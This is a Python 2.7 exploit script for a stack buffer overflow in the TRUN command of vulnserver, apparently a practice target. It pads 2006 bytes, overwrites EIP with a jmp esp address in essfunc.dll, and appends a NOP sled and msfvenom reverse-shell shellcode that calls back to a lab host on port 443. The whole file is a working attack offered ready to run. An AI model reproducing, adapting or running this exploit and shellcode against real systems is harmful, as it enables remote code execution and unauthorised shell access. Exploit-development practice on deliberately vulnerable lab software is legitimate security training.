#!/usr/bin/env python2.7

#Plain Buffer overflow in TRUN command in vulnserver
#overflow observed at 2100 characters beginning with a "." character due to invocation of  strcpy function

#importing libraries
import socket

def fuzzing(host,port,cmd):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.send(cmd)
		s.close()
	except Exception,e:
		print "[-]Exiting due to " + str(e)

def main():
	#Indentifying badchars
	#\x00
	#payload: msfvenom -p windows/shell_reverse_tcp 192.168.56.131 lport=443 -b "\x00" -f python
	buf =  ""
	buf += "\xb8\x83\xeb\xe0\x32\xda\xc8\xd9\x74\x24\xf4\x5b\x2b"
	buf += "\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xc0\xe5\x02"
	buf += "\xc7\x3a\x11\x40\x28\xc2\xe2\x25\xa0\x27\xd3\x65\xd6"
	buf += "\x2c\x44\x56\x9c\x60\x69\x1d\xf0\x90\xfa\x53\xdd\x97"
	buf += "\x4b\xd9\x3b\x96\x4c\x72\x7f\xb9\xce\x89\xac\x19\xee"
	buf += "\x41\xa1\x58\x37\xbf\x48\x08\xe0\xcb\xff\xbc\x85\x86"
	buf += "\xc3\x37\xd5\x07\x44\xa4\xae\x26\x65\x7b\xa4\x70\xa5"
	buf += "\x7a\x69\x09\xec\x64\x6e\x34\xa6\x1f\x44\xc2\x39\xc9"
	buf += "\x94\x2b\x95\x34\x19\xde\xe7\x71\x9e\x01\x92\x8b\xdc"
	buf += "\xbc\xa5\x48\x9e\x1a\x23\x4a\x38\xe8\x93\xb6\xb8\x3d"
	buf += "\x45\x3d\xb6\x8a\x01\x19\xdb\x0d\xc5\x12\xe7\x86\xe8"
	buf += "\xf4\x61\xdc\xce\xd0\x2a\x86\x6f\x41\x97\x69\x8f\x91"
	buf += "\x78\xd5\x35\xda\x95\x02\x44\x81\xf1\xe7\x65\x39\x02"
	buf += "\x60\xfd\x4a\x30\x2f\x55\xc4\x78\xb8\x73\x13\x7e\x93"
	buf += "\xc4\x8b\x81\x1c\x35\x82\x45\x48\x65\xbc\x6c\xf1\xee"
	buf += "\x3c\x90\x24\xa0\x6c\x3e\x97\x01\xdc\xfe\x47\xea\x36"
	buf += "\xf1\xb8\x0a\x39\xdb\xd0\xa1\xc0\x8c\x1e\x9d\xf2\xcf"
	buf += "\xf7\xdc\x02\xd1\xbc\x68\xe4\xbb\xd2\x3c\xbf\x53\x4a"
	buf += "\x65\x4b\xc5\x93\xb3\x36\xc5\x18\x30\xc7\x88\xe8\x3d"
	buf += "\xdb\x7d\x19\x08\x81\x28\x26\xa6\xad\xb7\xb5\x2d\x2d"
	buf += "\xb1\xa5\xf9\x7a\x96\x18\xf0\xee\x0a\x02\xaa\x0c\xd7"
	buf += "\xd2\x95\x94\x0c\x27\x1b\x15\xc0\x13\x3f\x05\x1c\x9b"
	buf += "\x7b\x71\xf0\xca\xd5\x2f\xb6\xa4\x97\x99\x60\x1a\x7e"
	buf += "\x4d\xf4\x50\x41\x0b\xf9\xbc\x37\xf3\x48\x69\x0e\x0c"
	buf += "\x64\xfd\x86\x75\x98\x9d\x69\xac\x18\xad\x23\xec\x09"
	buf += "\x26\xea\x65\x08\x2b\x0d\x50\x4f\x52\x8e\x50\x30\xa1"
	buf += "\x8e\x11\x35\xed\x08\xca\x47\x7e\xfd\xec\xf4\x7f\xd4"

	NOP = "\x90" * 30

	EIP = "\xaf\x11\x50\x62" #jmp esp in essfunc.dll

	buffer = "A" * 2006 + EIP + NOP + buf + "D"*4
	print "[+]sending crash buffer"
	cmd = "TRUN ." + buffer		#note we used "." character to cause the crash
	fuzzing("192.168.56.128",9999,cmd)
	print "[+]Done!"

if __name__ == "__main__":
	main()
